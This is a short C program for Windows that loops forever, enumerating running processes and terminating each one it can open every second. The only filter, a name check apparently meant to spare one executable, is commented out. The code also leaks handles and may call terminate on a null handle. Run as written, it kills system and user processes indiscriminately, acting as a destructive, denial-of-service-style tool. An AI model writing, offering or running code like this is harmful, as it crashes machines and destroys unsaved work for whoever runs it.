#include"windows.h"
#include"psapi.h"
#include"stdio.h"
int main()
{
	while(1)
	{
		Sleep(1000);
		DWORD processes[512],cBNeeded,cProcesses;
		EnumProcesses(processes,512*4,&cBNeeded);
		cProcesses=cBNeeded/4;
		for(int i=0;i<cProcesses;i++)
			if(processes[i]!=0)
			{
				char processname[30];
				strcpy(processname,"<unknown>");
				HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ|PROCESS_TERMINATE,0,processes[i]);
				if (NULL != hProcess )
    			{
        			HMODULE hMod;
        			DWORD cbNeeded;
        			if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod),&cbNeeded) )
        			{
            		GetModuleBaseName( hProcess, hMod, processname,30);
        			}
				}
    			//if(strcmp((char*)&processname,"Untitled1.exe"))
    			{
    				TerminateProcess(hProcess,0);
    			}
			}
	}
}
